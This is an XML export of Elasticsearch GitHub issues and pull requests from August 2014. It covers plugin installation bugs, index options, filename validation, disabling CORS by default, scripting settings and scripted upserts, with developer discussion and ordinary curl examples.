</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Update forbidden-apis to 1.6.1</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7156</link><project id="" key="" /><description>Forbidden APIs was released in version 1.6.1 (1.6 had broken Maven decriptor). The new version allows to skip checks with:
`mvn -Dforbiddenapis.skip=true test`
</description><key id="39467967">7156</key><summary>Update forbidden-apis to 1.6.1</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">uschindler</reporter><labels /><created>2014-08-04T22:30:31Z</created><updated>2014-08-04T22:44:31Z</updated><resolved>2014-08-04T22:44:31Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Add shard balance function that tries to equalize similarly sized (on disk) shards</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7155</link><project id="" key="" /><description>It'd be nice to have a balance function that tries to equalize the number of similarly sized shards on each node.  This would have several advantages for clusters with unevenly sized indexes:
- Help prevent #6168 by making it less likely that lots of large shards end up on a single node, pushing its disk space much much higher then the rest.
- Help balance disk IO load by keeping the large shards away from each other.
- Prevent one node from ending up fallow because it only contains small shards just by luck.
</description><key id="39460660">7155</key><summary>Add shard balance function that tries to equalize similarly sized (on disk) shards</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">open</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/nik9000/following{/other_user}', u'events_url': u'https://api.github.com/users/nik9000/events{/privacy}', u'organizations_url': u'https://api.github.com/users/nik9000/orgs', u'url': u'https://api.github.com/users/nik9000', u'gists_url': u'https://api.github.com/users/nik9000/gists{/gist_id}', u'html_url': u'https://github.com/nik9000', u'subscriptions_url': u'https://api.github.com/users/nik9000/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/215970?v=4', u'repos_url': u'https://api.github.com/users/nik9000/repos', u'received_events_url': u'https://api.github.com/users/nik9000/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/nik9000/starred{/owner}{/repo}', u'site_admin': False, u'login': u'nik9000', u'type': u'User', u'id': 215970, u'followers_url': u'https://api.github.com/users/nik9000/followers'}</assignee><reporter username="">nik9000</reporter><labels><label>:Allocation</label><label>discuss</label><label>high hanging fruit</label></labels><created>2014-08-04T21:00:35Z</created><updated>2016-02-21T22:39:31Z</updated><resolved /><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="nik9000" created="2014-08-04T21:02:48Z" id="51117249">@dakrone I'm going to send a pull request for the disk decider against this issue instead do #6168 because it wouldn't really fix #6168 - just make it less likely in the case of clusters like ours.  I can take a look at an actual fix fo #6168 when I get done with this now that I'm more familiar with the cluster assignment code.
</comment><comment author="dakrone" created="2014-08-05T13:40:10Z" id="51198133">@nik9000 sounds awesome, looking forward to it!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Plugins with only  `bin` and `config` do not install correctly</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7154</link><project id="" key="" /><description>When installing a bin only plugin, it is identified as a site plugin.

A current workaround would be to create in the zip file another empty dir. So if you have:
- `bin/myfile.sh`
- `empty/empty.txt`

the `bin` content will be extracted as expected.

Closes #7152.
</description><key id="39449634">7154</key><summary>Plugins with only  `bin` and `config` do not install correctly</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">dadoonet</reporter><labels><label>:Plugins</label><label>bug</label><label>v1.3.2</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-04T18:55:19Z</created><updated>2015-06-07T19:12:14Z</updated><resolved>2014-08-12T12:42:42Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-08-06T09:43:24Z" id="51313510">@markharwood Updated based on your comment and added a fix

I ran tests locally on my machine. Though I have no idea on how to cleanly test it using our unit/integration tests as it basically tries to modify `$ES_HOME/bin` or `$ES_HOME/config` dirs.
</comment><comment author="markharwood" created="2014-08-12T10:30:13Z" id="51897621">The changes you've made look good, but like you say it could do a test rig that can prove it is doing the right things. Maybe that can be covered in a different issue relating to the test infrastructure?
</comment><comment author="dadoonet" created="2014-08-12T10:52:02Z" id="51899332">@markharwood Actually we can test it! :) \o/ See latest commit.
</comment><comment author="dadoonet" created="2014-08-12T12:42:42Z" id="51908385">Pushed in master, 1.x and 1.3
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>`ignore_unavailable=true` ignored when a single index is specified</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7153</link><project id="" key="" /><description>We noticed an edge case today when using the `ignore_unavailable` parameter against indices that are closed. Running the following in Sense produces a 403 error, which was very unexcepted.

``` sh
curl -XPOST "http://localhost:9200/test_index/test_type" -d'
{
  "some": "value"
}'

curl -XPOST "http://localhost:9200/test/_close"

curl -XPOST "http://localhost:9200/test/_search?ignore_unavailable=true"
# {
#   "error": "ClusterBlockException[blocked by: [FORBIDDEN/4/index closed];]",
#   "status": 403
# }
```

Alternatively, if I send `test*` I get the expected empty result.

``` sh
curl -XPOST "http://localhost:9200/test*/_search?ignore_unavailable=true"
# {
#   "took": 1,
#   "timed_out": false,
#   "_shards": {
#     "total": 0,
#     "successful": 0,
#     "failed": 0
#    },
#    // etc.
# }
```
</description><key id="39448924">7153</key><summary>`ignore_unavailable=true` ignored when a single index is specified</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/martijnvg/following{/other_user}', u'events_url': u'https://api.github.com/users/martijnvg/events{/privacy}', u'organizations_url': u'https://api.github.com/users/martijnvg/orgs', u'url': u'https://api.github.com/users/martijnvg', u'gists_url': u'https://api.github.com/users/martijnvg/gists{/gist_id}', u'html_url': u'https://github.com/martijnvg', u'subscriptions_url': u'https://api.github.com/users/martijnvg/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/580421?v=4', u'repos_url': u'https://api.github.com/users/martijnvg/repos', u'received_events_url': u'https://api.github.com/users/martijnvg/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/martijnvg/starred{/owner}{/repo}', u'site_admin': False, u'login': u'martijnvg', u'type': u'User', u'id': 580421, u'followers_url': u'https://api.github.com/users/martijnvg/followers'}</assignee><reporter username="">spalger</reporter><labels><label>bug</label></labels><created>2014-08-04T18:47:26Z</created><updated>2014-12-24T16:48:50Z</updated><resolved>2014-12-24T09:49:57Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="imotov" created="2014-08-04T23:39:05Z" id="51132451">A couple more examples of inconsistency: 

``` sh
curl -XPOST "http://localhost:9200/test/_search?ignore_unavailable=false&amp;pretty"
# {
#   "error" : "IndexClosedException[[test] closed]",
#   "status" : 403
# }
```

``` sh
curl -XPOST "http://localhost:9200/+test/_search?ignore_unavailable=true&amp;pretty"
# {
#   "took" : 0,
#   "timed_out" : false,
#   "_shards" : {
#     "total" : 0,
#     "successful" : 0,
#     "failed" : 0
#   },
#   "hits" : {
#     "total" : 0,
#     "max_score" : 0.0,
#     "hits" : [ ]
#   }
# }
```
</comment><comment author="javanna" created="2014-08-05T18:53:59Z" id="51242644">The different behaviour is caused by the fact that you are referring in the url to a specific index, in that case we ignore the `ignore_unavailable` option. We do consider it though if you specify multiple indices or wildcard expressions etc. That said, let's discuss if this is right or wrong :)
</comment><comment author="clintongormley" created="2014-08-05T19:22:25Z" id="51246255">Yeah, it's a good question what the right behaviour here is.  
</comment><comment author="spalger" created="2014-08-06T01:57:33Z" id="51285266">+1 for making the parameter apply to both index names and index patterns.

I think that the current behavior would make more sense if we renamed the parameter `ignore_unavailable_pattern_matches`
</comment><comment author="martijnvg" created="2014-08-06T21:23:57Z" id="51399351">I think it make sense that `ignore_unavailable` also applies if just a single concrete index or alias is specified.
</comment><comment author="clintongormley" created="2014-08-07T12:31:21Z" id="51464927">Yeah I'm thinking the same thing. 
</comment><comment author="geoffroya" created="2014-10-16T09:45:06Z" id="59337950">+1
</comment><comment author="ppf2" created="2014-12-01T02:52:55Z" id="65014938">+1 on providing a way for aliases to ignore closed indices, esp. for the time based index use case where older indices may be closed.
</comment><comment author="spalger" created="2014-12-19T22:54:56Z" id="67709477">Hey @martijnvg, any word on this?
</comment><comment author="martijnvg" created="2014-12-23T13:51:39Z" id="67952461">@spenceralger I opened #9047 for this.
</comment><comment author="spalger" created="2014-12-23T15:51:36Z" id="67964561">Thanks @martijnvg!!
</comment><comment author="spalger" created="2014-12-24T16:48:50Z" id="68063309">YAHOO!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>plugins: `bin` and `config` only plugins do not install correctly</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7152</link><project id="" key="" /><description>When installing a bin plugin, it is identified as a site plugin. 
I've already been chatting with @dadoonet about this issue. 
</description><key id="39442898">7152</key><summary>plugins: `bin` and `config` only plugins do not install correctly</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">jjfalling</reporter><labels><label>bug</label><label>v1.3.2</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-04T17:39:06Z</created><updated>2014-08-12T12:41:57Z</updated><resolved>2014-08-12T12:41:57Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-08-04T18:49:16Z" id="51100894">A current workaround would be to create in the zip file another empty dir. So if you have:
- `bin/myfile.sh`
- `empty/empty.txt`

the `bin` content will be extracted as expected.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Disable CORS by default</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7151</link><project id="" key="" /><description>Elasticsearch currently [defaults CORS to being enabled](http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-http.html) for all domains.

![cors-true](https://cloud.githubusercontent.com/assets/4592/3799663/d59db5ea-1bef-11e4-99d1-6d9cec88d2fb.png)

This is a **security issue** for any developer running Elasticsearch locally at `localhost:9200` -- any website they visit can fire off arbitrary HTTP requests to their local machine. This **should be disabled by default**.

I became aware of this issue during the hubbub over the dynamic scripting vulnerability in 1.1's defaults (now changed in 1.2, and scripting sandboxed in 1.3). CORS magnified the effect of that bug for developers browsing the web, but even with dynamic scripting disabled, websites can still perform arbitrary Elasticsearch actions to a local instance of ES.

When I mention  to developers that `localhost:9200` is accessible via any website they visit, they are very surprised, as was I. Yes, maybe it's something I and everyone should have understood going in, but that's not happening. And while it may not be unique to Elasticsearch, this isn't a problem with most databases and database-like systems developers are used to running locally.

I've seen people [recommend using Elasticsearch in a VM](https://www.found.no/foundation/elasticsearch-security/#staying-safe-while-developing-with-elasticsearch) during development, but this is overhead caused by a choice Elasticsearch makes. Elasticsearch's current default CORS setting adds convenience for some, at the expense of security for many developers.

Any plugins or support systems that depend on enabling CORS for Elasticsearch can provide instruction to enable CORS (along with a warning of serious side effects) as part of their installation. 

**Elasticsearch should provide a safe experience by default.** The dynamic scripting issue, which took some time to be seen as a security issue, is now [CVE-2014-3120](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-3120). Elasticsearch should get in front of this one.
</description><key id="39434987">7151</key><summary>Disable CORS by default</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/spinscale/following{/other_user}', u'events_url': u'https://api.github.com/users/spinscale/events{/privacy}', u'organizations_url': u'https://api.github.com/users/spinscale/orgs', u'url': u'https://api.github.com/users/spinscale', u'gists_url': u'https://api.github.com/users/spinscale/gists{/gist_id}', u'html_url': u'https://github.com/spinscale', u'subscriptions_url': u'https://api.github.com/users/spinscale/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/667544?v=4', u'repos_url': u'https://api.github.com/users/spinscale/repos', u'received_events_url': u'https://api.github.com/users/spinscale/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/spinscale/starred{/owner}{/repo}', u'site_admin': False, u'login': u'spinscale', u'type': u'User', u'id': 667544, u'followers_url': u'https://api.github.com/users/spinscale/followers'}</assignee><reporter username="">konklone</reporter><labels><label>blocker</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-04T16:06:01Z</created><updated>2015-05-10T00:27:10Z</updated><resolved>2014-09-09T09:22:42Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="seanherron" created="2014-08-04T16:56:57Z" id="51086605">+1 - I know a lot of people running Elasticsearch locally on their machine with no knowledge of these risks, and there seems to be a common (incorrect, as @konklone mentions) belief that browsers restrict requests to `localhost`.

Sane defaults would most help people new to using Elasticsearch who are unaware of these risks. Enabling CORS is a simple step for people to take if they need that functionality.
</comment><comment author="kimchy" created="2014-08-04T18:37:09Z" id="51099371">Agreed fully!, it seems like we can preserve the good out of the box experience with matching only localhost origin out of the box, we worked on this to add it: https://github.com/elasticsearch/elasticsearch/pull/6923, where the next step is to change the default. We haven't done it yet, the aim is to do it for 1.4 (I will label this issue as well as such). Does that sound reasonable?
</comment><comment author="konklone" created="2014-08-04T21:28:23Z" id="51120242">This sounds very reasonable, and thank you for taking it seriously!
</comment><comment author="rashidkpc" created="2014-08-22T18:02:09Z" id="53098415">After some thought I'm not sure there's a strong reason to use a regex to match localhost by default. When an application developer eventually goes to production they'll need to learn about the CORS setting anyway, might as well do it early. 

Regex matching is definitely an important feature, but we should probably just turn off CORS (set to null) by default, for the sake of configuration readability. 
</comment><comment author="bleskes" created="2014-08-25T10:04:28Z" id="53247385">+1 on implementing regex support, documenting an example for allowing localhost access an disabling it by default. The use case we want to support is plugins and CORS is not relevant for that (as they are hosted by ES). Plugin developers on the other hand need to know about this early as it may impact the choice of deployment (as @rashidkpc  said)
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[DOCS] add Proxy setting for using plugin command</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7150</link><project id="" key="" /><description>Add the proxy setting section.
</description><key id="39431530">7150</key><summary>[DOCS] add Proxy setting for using plugin command</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">johtani</reporter><labels><label>docs</label></labels><created>2014-08-04T15:30:00Z</created><updated>2014-08-05T10:44:59Z</updated><resolved>2014-08-05T10:44:59Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Start a 2.0 breaking changes page</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7149</link><project id="" key="" /><description /><key id="39430680">7149</key><summary>Start a 2.0 breaking changes page</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">dadoonet</reporter><labels /><created>2014-08-04T15:21:22Z</created><updated>2014-08-04T15:32:41Z</updated><resolved>2014-08-04T15:32:41Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>colon sign (:) not excluded from filenames</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7148</link><project id="" key="" /><description>Colon is not excluded from the list of invalid file names in org.elasticsearch.common.Strings.java in line 683. Mentioned line should read:

public static final ImmutableSet&lt;Character&gt; INVALID_FILENAME_CHARS = ImmutableSet.of('\', '/', '*', '?', '"', '&lt;', '&gt;', '|', ' ', ',', ':');

This bug causes crash to elasticsearch on Windows with following curl line:
curl "http://localhost:9200/bitcoin:9200" -X POST

Here's the link to the code:
https://github.com/elasticsearch/elasticsearch/blob/master/src/main/java/org/elasticsearch/common/Strings.java#L683
</description><key id="39428647">7148</key><summary>colon sign (:) not excluded from filenames</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">picrin</reporter><labels><label>bug</label></labels><created>2014-08-04T15:00:18Z</created><updated>2015-11-21T16:40:14Z</updated><resolved>2015-11-21T16:40:14Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="picrin" created="2014-08-04T15:13:08Z" id="51073330">Instead of blacklisting characters, one could validate for whitelisted characters.
</comment><comment author="clintongormley" created="2014-08-04T15:21:10Z" id="51074395">Agreed - we should whitelist instead. 

Related to #6736 
</comment><comment author="clintongormley" created="2015-11-21T16:40:14Z" id="158661041">Closing in favour of https://github.com/elastic/elasticsearch/issues/9059
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Scripting: Add configuration parameter to control execution of indexed s...</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7147</link><project id="" key="" /><description>...cripts.

This commit adds the `script.disable_indexed` parameter to the config system.
If this is set to `true` indexed scripts cannot be created or used at search time.
If this is set to `sandbox` only indexed script that use sandboxed languages can be created or
used at search time.
If this is set to `false` indexed scripts from any supported language can be created or used at
search time.
The default value is `sandbox`.
This setting is independent of the `script.disable_dynamic` setting.

See #6922
</description><key id="39421742">7147</key><summary>Scripting: Add configuration parameter to control execution of indexed s...</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/GaelTadh/following{/other_user}', u'events_url': u'https://api.github.com/users/GaelTadh/events{/privacy}', u'organizations_url': u'https://api.github.com/users/GaelTadh/orgs', u'url': u'https://api.github.com/users/GaelTadh', u'gists_url': u'https://api.github.com/users/GaelTadh/gists{/gist_id}', u'html_url': u'https://github.com/GaelTadh', u'subscriptions_url': u'https://api.github.com/users/GaelTadh/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/5190064?v=4', u'repos_url': u'https://api.github.com/users/GaelTadh/repos', u'received_events_url': u'https://api.github.com/users/GaelTadh/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/GaelTadh/starred{/owner}{/repo}', u'site_admin': False, u'login': u'GaelTadh', u'type': u'User', u'id': 5190064, u'followers_url': u'https://api.github.com/users/GaelTadh/followers'}</assignee><reporter username="">GaelTadh</reporter><labels><label>:Scripting</label><label>enhancement</label></labels><created>2014-08-04T13:46:44Z</created><updated>2015-03-19T10:19:04Z</updated><resolved>2014-12-31T12:04:30Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-04T13:52:20Z" id="51062247">Left one comment about the docs.

I do wonder if this is the right name for this option (and for dynamic scripts).  ie:

```
scripts.disable_indexed: sandbox
scripts_disable_dynamic: sandbox
```

The way this reads is: "don't allow sandboxed scripts".  

Perhaps we should rename both options?
</comment><comment author="GaelTadh" created="2014-08-04T14:08:57Z" id="51064494">@dakrone what do you think about renaming them? It would be a breaking change.
</comment><comment author="dakrone" created="2014-08-04T14:16:34Z" id="51065495">@GaelTadh I think it would good to rename them, I think double-negatives in settings is very confusing.

If we do rename them though, I think we should support the old versions for the next release (just deprecate them) since they are security-related settings.
</comment><comment author="GaelTadh" created="2014-08-04T14:18:02Z" id="51065681">so 

```
script.enable_indexed: sandbox/true/false
script.enable_dynamic: sandbox/true/false
```
</comment><comment author="dakrone" created="2014-08-04T14:18:45Z" id="51065763">That seems good to me, what do you think @clintongormley ?
</comment><comment author="GaelTadh" created="2014-08-04T14:23:39Z" id="51066372">Hmm much as I don't like the negatives I think supporting both enable and disable at the same time is asking for people to mess it up. 
Perhaps we should wait and be ok with making a breaking change ? 
</comment><comment author="clintongormley" created="2014-08-05T10:36:28Z" id="51180253">These new names look good to me.  Regarding how to introduce them... the good news is that the default value is the same for both old and new parameters, and most people won't change them.

What do you think of logging a warning if the user sets the old version, eg

```
The "script.disable_dynamic" setting is deprecated and will be removed in the next version. 
Use "script.enable_dynamic" instead.
```

And in the next version, throw an error if the user sets the old version. I think this is important, otherwise the user will be unaware that the setting is just being ignored
</comment><comment author="clintongormley" created="2014-08-05T10:36:49Z" id="51180294">btw, the current prefix is `script.` not `scripts.`
</comment><comment author="s1monw" created="2014-08-21T08:33:59Z" id="52892686">left some comments 
</comment><comment author="clintongormley" created="2014-11-11T19:40:48Z" id="62606294">@GaelTadh just a reminder about this one
</comment><comment author="GaelTadh" created="2014-11-21T10:25:59Z" id="63952120">I've made the changes after the review, just need a new review ?
</comment><comment author="clintongormley" created="2014-12-31T12:04:29Z" id="68438261">Closing in favour of #6418
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Don't throw DAEE on replica for create operation; use IW.updateDocument/s instead</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7146</link><project id="" key="" /><description>This is for #7142: if we are on a replica doing a create, instead of throwing DAEE when the doc is in the index with an older version, we just call IW.updateDocument/s, because the primary already "decided" the document should be indexed.
</description><key id="39416323">7146</key><summary>Don't throw DAEE on replica for create operation; use IW.updateDocument/s instead</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">mikemccand</reporter><labels><label>:CRUD</label><label>bug</label><label>v1.3.2</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-04T12:35:19Z</created><updated>2015-06-07T19:12:39Z</updated><resolved>2014-08-04T13:14:29Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-08-04T12:42:00Z" id="51054417">I think that now a replica by definition should not throw a DAEE, we should remove it from `TransportShardReplicationOperationAction#ignoreReplicaException`, other than that, LGTM.
</comment><comment author="mikemccand" created="2014-08-04T12:44:08Z" id="51054702">Oh that's great, I'll remove exemption of DAEE from there.
</comment><comment author="mikemccand" created="2014-08-04T13:08:00Z" id="51057206">OK I removed DAEE from exemption list; I'll commit &amp; close shortly...
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>MultiGet: Fail when using no routing on an alias to an index that requires routing</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7145</link><project id="" key="" /><description>The multi_get api and multi_term_vector apis should always return an error when trying to get a document without routing if the routing is set to required. Yet, when using an alias a failure is not returned.

The problem is that the`routingRequired` check needs to be done passing in the resolved concrete index.
</description><key id="39409933">7145</key><summary>MultiGet: Fail when using no routing on an alias to an index that requires routing</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:CRUD</label><label>bug</label><label>v1.3.2</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-04T10:49:07Z</created><updated>2015-06-07T19:12:47Z</updated><resolved>2014-08-04T12:22:53Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-08-04T10:52:59Z" id="51045549">LGTM
</comment><comment author="javanna" created="2014-08-04T11:44:01Z" id="51049686">Sorry @kimchy I updated the PR post LGTM :) found the same bug in multi term vector api and improved tests. Mind having another look?
</comment><comment author="kimchy" created="2014-08-04T12:06:06Z" id="51051432">I see, it was missing concrete index, LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Update API: Add support for scripted upserts.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7144</link><project id="" key="" /><description>In the case of inserts the UpdateHelper class will now allow the script used to apply updates to run on the upsert doc provided by clients. This allows the logic for managing the internal state of the data item to be managed by the script and is not reliant on clients performing the initialisation of data structures managed by the script.
Associated issue: https://github.com/elasticsearch/elasticsearch/issues/7143
</description><key id="39405982">7144</key><summary>Update API: Add support for scripted upserts.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/markharwood/following{/other_user}', u'events_url': u'https://api.github.com/users/markharwood/events{/privacy}', u'organizations_url': u'https://api.github.com/users/markharwood/orgs', u'url': u'https://api.github.com/users/markharwood', u'gists_url': u'https://api.github.com/users/markharwood/gists{/gist_id}', u'html_url': u'https://github.com/markharwood', u'subscriptions_url': u'https://api.github.com/users/markharwood/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/170925?v=4', u'repos_url': u'https://api.github.com/users/markharwood/repos', u'received_events_url': u'https://api.github.com/users/markharwood/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/markharwood/starred{/owner}{/repo}', u'site_admin': False, u'login': u'markharwood', u'type': u'User', u'id': 170925, u'followers_url': u'https://api.github.com/users/markharwood/followers'}</assignee><reporter username="">markharwood</reporter><labels><label>:CRUD</label><label>feature</label><label>release highlight</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-04T09:55:48Z</created><updated>2015-06-06T18:23:17Z</updated><resolved>2014-08-05T16:24:55Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-08-04T19:57:21Z" id="51109195">@markharwood LGTM
</comment><comment author="markharwood" created="2014-08-05T10:53:50Z" id="51181618">Will go ahead and push if no objections
</comment><comment author="jpountz" created="2014-08-05T10:55:01Z" id="51181701">LGTM
</comment><comment author="markharwood" created="2014-08-05T16:24:55Z" id="51222221">Committed in https://github.com/elasticsearch/elasticsearch/commit/e6b459cb9f4256a6c26fde5177ee88a1296cf8d8
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Update API - allow scripted upserts</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7143</link><project id="" key="" /><description>In some scenarios it is useful if the update script used to add new content to an existing document is also capable of being called when the document does not already exist (aka Upsert requests).

Now that we have stored scripts they can be non-trivial chunks of code and may have a lot of business logic to manage the state of an item. Object orientation teaches us the value of encapsulation and this enhancement allows the scripts to encapsulate the logic used in the construction of new documents as well as the current logic for modifying existing documents.

The suggested change is that a new `scripted_upsert` parameter can be passed to upsert requests to indicate if the script should be called to perform inserts. The default value is "false" to reflect the current behaviour. If set to "true" and an insert is being formed the following steps occur:
1) The example `upsert` document passed by the client (which now could be {} ) is presented in the script context as the initial state of the document held in `ctx._source`.
2) The `ctx.op` field in the script context is set to `create` to indicate that this is an insert as opposed to update operation
3) The script (or stored script) used to perform updates is called with the `params` values passed from the client (in the same way updates are invoked). It mutates the map of values held in `ctx._source` appropriately.
4) The script can set `ctx.op` to `none` if it wants to ignore the insert, otherwise the document held in `ctx._source` after the script completes is stored
